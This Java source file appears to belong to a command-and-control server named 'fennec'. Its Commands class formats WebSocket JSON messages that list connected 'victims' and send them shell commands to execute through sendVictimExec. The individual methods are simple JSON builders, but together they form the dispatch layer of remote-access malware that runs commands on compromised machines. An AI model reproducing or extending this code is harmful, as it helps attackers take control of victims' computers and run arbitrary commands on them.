package com.heshanthenura.fennec;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import java.util.concurrent.CopyOnWriteArraySet;
import jakarta.websocket.Session;

public class Commands {

    public String lv(CopyOnWriteArraySet<Session> victims) {
        try {
            ObjectMapper mapper = new ObjectMapper();

            // Create the main object node
            ObjectNode response = mapper.createObjectNode();
            response.put("type", "info");
            response.put("info_name", "lv");

            // Add the IDs array
            ArrayNode idsArray = response.putArray("data");
            for (Session victim : victims) {
                idsArray.add(victim.getId());
            }

            // Convert to JSON string and return
            return response.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"type\":\"error\",\"message\":\"Failed to generate JSON\"}";
        }
    }

    public String notify(String info) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            ObjectNode response = mapper.createObjectNode();
            response.put("type", "notify");
            response.put("data", info);
            return response.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"type\":\"error\",\"message\":\"Failed to generate JSON\"}";
        }
    }

    public String setClientId(String id) {
        try {
            ObjectMapper mapper = new ObjectMapper();

            ObjectNode response = mapper.createObjectNode();
            response.put("type", "info");
            response.put("info_name", "my_id");
            response.put("data", id);
            return response.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"type\":\"error\",\"message\":\"Failed to generate JSON\"}";
        }
    }

    public String sendVictimExec(String id,String command) {
        try {
            ObjectMapper mapper = new ObjectMapper();

            ObjectNode response = mapper.createObjectNode();
            response.put("type", "exec");
            response.put("client_id", id);
            response.put("command", command);
            return response.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"type\":\"error\",\"message\":\"Failed to generate JSON\"}";
        }
    }



}

